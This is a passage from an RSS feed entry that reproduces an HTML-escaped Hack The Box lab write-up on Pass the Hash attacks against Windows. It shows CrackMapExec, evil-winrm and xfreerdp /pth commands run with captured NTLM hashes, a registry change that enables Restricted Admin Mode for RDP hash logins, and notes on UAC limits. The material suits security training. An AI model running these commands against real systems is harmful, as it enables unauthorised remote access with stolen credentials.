SMB         10.129.201.126  445    MS01            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] .&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator 30B3783CE2ABF1AF70F77D0660CF3453 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.129.201.126  445    MS01            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Executed &lt;span class=&quot;nb&quot;&gt;command 
&lt;/span&gt;SMB         10.129.201.126  445    MS01            MS01&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Review the &lt;a href=&quot;https://web.archive.org/web/20220902185948/https://wiki.porchetta.industries/&quot;&gt;CrackMapExec documentation Wiki&lt;/a&gt; (&lt;a href=&quot;https://www.netexec.wiki/&quot;&gt;NetExec documentation wiki&lt;/a&gt;) to learn more about the tool’s extensive features.&lt;/p&gt;

&lt;h2 id=&quot;pass-the-hash-with-evil-winrm-linux&quot;&gt;Pass the Hash with evil-winrm (Linux)&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;evil-winrm&lt;/a&gt; is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don’t have administrative rights, we can use this alternative protocol to connect to the target machine.&lt;/p&gt;

&lt;h4 id=&quot;pass-the-hash-with-evil-winrm&quot;&gt;Pass the Hash with evil-winrm&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.129.201.126 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb&lt;/p&gt;

&lt;h2 id=&quot;pass-the-hash-with-rdp-linux&quot;&gt;Pass the Hash with RDP (Linux)&lt;/h2&gt;

&lt;p&gt;We can perform an RDP PtH attack to gain GUI access to the target system using tools like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;There are a few caveats to this attack:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Restricted Admin Mode&lt;/code&gt;, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/rdp_session-4.png&quot; alt=&quot;Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This can be enabled by adding a new registry key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DisableRestrictedAdmin&lt;/code&gt; (REG_DWORD) under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa&lt;/code&gt; with the value of 0. It can be done using the following command:&lt;/p&gt;

&lt;h4 id=&quot;enable-restricted-admin-mode-to-allow-pth&quot;&gt;Enable Restricted Admin Mode to Allow PtH&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;c:\tools&amp;gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/rdp_session-5.png&quot; alt=&quot;Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the registry key is added, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xfreerdp&lt;/code&gt; with the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/pth&lt;/code&gt; to gain RDP access:&lt;/p&gt;

&lt;h4 id=&quot;pass-the-hash-using-rdp&quot;&gt;Pass the Hash Using RDP&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:38:26:999] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;94965:94966] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:38:26:999] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;94965:94966] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:38:26:352] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;94965:94966] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:38:26:352] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;94965:94966] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:38:26:352] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;94965:94966] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/rdp_session_new.jpg&quot; alt=&quot;Windows desktop accessed via FreeRDP with Parrot Terminal showing command execution and desktop icons for Recycle Bin, Invoke-TheHash, and mimikatz.&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;uac-limits-pass-the-hash-for-local-accounts&quot;&gt;UAC Limits Pass the Hash for Local Accounts&lt;/h2&gt;

&lt;p&gt;UAC (User Account Control) limits local users’ ability to perform remote administration operations. When the registry key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy&lt;/code&gt; is set to 0, it means that the built-in local admin account (RID-500, “Administrator”) is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; There is one exception, if the registry key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FilterAdministratorToken&lt;/code&gt; (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.&lt;/p&gt;

&lt;p&gt;These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder’s blog post &lt;a href=&quot;https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167&quot;&gt;Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy&lt;/a&gt;.&lt;/p&gt;
</description>
        <pubDate>Tue, 08 Apr 2025 00:00:00 +0200</pubDate>
        <link>http://localhost:4000//Blogspot</link>
        <link href="http://localhost:4000/Blogspot"/>
        <guid isPermaLink="true">http://localhost:4000/Blogspot</guid>
      </item>
    
  </channel>
</rss>
